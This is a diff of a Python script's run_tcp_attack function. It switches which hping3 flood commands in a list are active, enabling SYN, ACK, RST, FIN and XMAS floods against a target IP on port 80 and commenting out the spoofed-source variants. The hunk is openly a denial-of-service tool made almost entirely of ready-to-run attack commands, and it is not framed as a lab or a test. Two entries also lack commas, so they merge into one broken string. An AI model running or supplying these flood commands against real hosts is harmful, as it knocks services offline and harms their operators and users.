@@ -11,27 +11,27 @@ def run_tcp_attack(target_ip):
     print(f"Starting TCP Attacks on {target_ip}...")
 
     tcp_attacks = [
-        # f"hping3 -S --flood -p 80 {target_ip}",
-        # f"hping3 -A --flood -p 80 {target_ip}",
-        # f"hping3 -R --flood -p 80 {target_ip}",
-        # f"hping3 -F --flood -p 80 {target_ip}",
-        # f"hping3 -F -P -U --flood -p 80 {target_ip}",
-        # f"hping3 -S -p 80 -d 10 --flood {target_ip}",
-        # f"hping3 -S --flood -p 80 --data {len(random_payload())} --file <(echo -n '{random_payload()}') {target_ip}",
-        # f"hping3 -A --flood -p 80 --data {len(random_payload())} --file <(echo -n '{random_payload()}') {target_ip}",
-        # f"hping3 -R --flood -p 80 --data {len(random_payload())} --file <(echo -n '{random_payload()}') {target_ip}",
-        # f"hping3 -F --flood -p 80 --data {len(random_payload())} --file <(echo -n '{random_payload()}') {target_ip}",
-        # f"hping3 -F -P -U --flood -p 80 --data {len(random_payload())} --file <(echo -n '{random_payload()}') {target_ip}",
-        # f"hping3 -S -p 80 -d {len(random_payload())} --flood --file <(echo -n '{random_payload()}') {target_ip}",
+        f"hping3 -S --flood -p 80 {target_ip}",
+        f"hping3 -A --flood -p 80 {target_ip}",
+        f"hping3 -R --flood -p 80 {target_ip}",
+        f"hping3 -F --flood -p 80 {target_ip}",
+        f"hping3 -F -P -U --flood -p 80 {target_ip}",
+        f"hping3 -S -p 80 -d 10 --flood {target_ip}",
+        f"hping3 -S --flood -p 80 --data {len(random_payload())} --file <(echo -n '{random_payload()}') {target_ip}",
+        f"hping3 -A --flood -p 80 --data {len(random_payload())} --file <(echo -n '{random_payload()}') {target_ip}",
+        f"hping3 -R --flood -p 80 --data {len(random_payload())} --file <(echo -n '{random_payload()}') {target_ip}",
+        f"hping3 -F --flood -p 80 --data {len(random_payload())} --file <(echo -n '{random_payload()}') {target_ip}",
+        f"hping3 -F -P -U --flood -p 80 --data {len(random_payload())} --file <(echo -n '{random_payload()}') {target_ip}",
+        f"hping3 -S -p 80 -d {len(random_payload())} --flood --file <(echo -n '{random_payload()}') {target_ip}",
     
-        f"hping3 -S --flood -p 80 --rand-source {target_ip}",
-        f"hping3 -A --flood -p 80 --rand-source {target_ip}",
-        f"hping3 -R --flood -p 80 --rand-source {target_ip}",
-        f"hping3 -F --flood -p 80 --rand-source {target_ip}",
-        f"hping3 -F -P -U --flood -p 80 --rand-source {target_ip}",
-        f"hping3 -S -p 80 -d 10 --flood --rand-source {target_ip}",
-        f"hping3 -S -p {random.randint(1, 65535)} --flood --rand-source {target_ip}"
-        f"hping3 -S -p 80 -d {random.randint(500, 1500)} --flood {target_ip}"
+        # f"hping3 -S --flood -p 80 --rand-source {target_ip}",
+        # f"hping3 -A --flood -p 80 --rand-source {target_ip}",
+        # f"hping3 -R --flood -p 80 --rand-source {target_ip}",
+        # f"hping3 -F --flood -p 80 --rand-source {target_ip}",
+        # f"hping3 -F -P -U --flood -p 80 --rand-source {target_ip}",
+        # f"hping3 -S -p 80 -d 10 --flood --rand-source {target_ip}",
+        # f"hping3 -S -p {random.randint(1, 65535)} --flood --rand-source {target_ip}"
+        # f"hping3 -S -p 80 -d {random.randint(500, 1500)} --flood {target_ip}"
     ]
 
     # Uncomment to include additional TCP attack variations
